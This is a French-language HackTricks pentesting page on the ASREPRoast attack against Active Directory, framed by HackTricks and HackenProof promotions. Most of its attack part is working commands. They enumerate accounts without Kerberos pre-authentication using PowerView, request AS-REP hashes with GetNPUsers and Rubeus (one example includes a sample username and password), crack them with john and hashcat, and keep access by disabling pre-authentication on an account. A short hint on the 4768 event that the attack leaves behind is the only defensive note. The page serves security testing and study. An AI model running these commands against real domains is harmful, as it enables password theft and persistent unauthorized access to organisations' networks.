# ASREPRoast

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du hacker web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

## ASREPRoast

L'attaque ASREPRoast recherche les **utilisateurs sans l'attribut de pré-authentification Kerberos requis (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.

Cela signifie que n'importe qui peut envoyer une demande AS\_REQ au DC au nom de l'un de ces utilisateurs et recevoir un message AS\_REP. Ce dernier type de message contient un morceau de données chiffrées avec la clé utilisateur d'origine, dérivée de son mot de passe. En utilisant ce message, le mot de passe de l'utilisateur peut être craqué hors ligne.

De plus, **aucun compte de domaine n'est nécessaire pour effectuer cette attaque**, seulement une connexion au DC. Cependant, **avec un compte de domaine**, une requête LDAP peut être utilisée pour **récupérer les utilisateurs sans pré-authentification Kerberos** dans le domaine. **Sinon, les noms d'utilisateur doivent être devinés**.

#### Énumération des utilisateurs vulnérables (nécessite des informations d'identification de domaine)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### Demande de message AS_REP

{% code title="Utilisation de Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Utilisation de Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
La méthode AS-REP Roasting avec Rubeus générera un 4768 avec un type de chiffrement de 0x17 et un type de préauthentification de 0.
{% endhint %}

### Crackage
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistance

Forcer **preauth** non requis pour un utilisateur pour lequel vous avez les permissions **GenericAll** (ou les permissions pour écrire des propriétés) :
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## Références

[**Plus d'informations sur l'attaque AS-REP Roasting sur ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez une récompense sans délai**\
Les primes HackenProof sont lancées uniquement lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez une légende du hacking web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? Ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
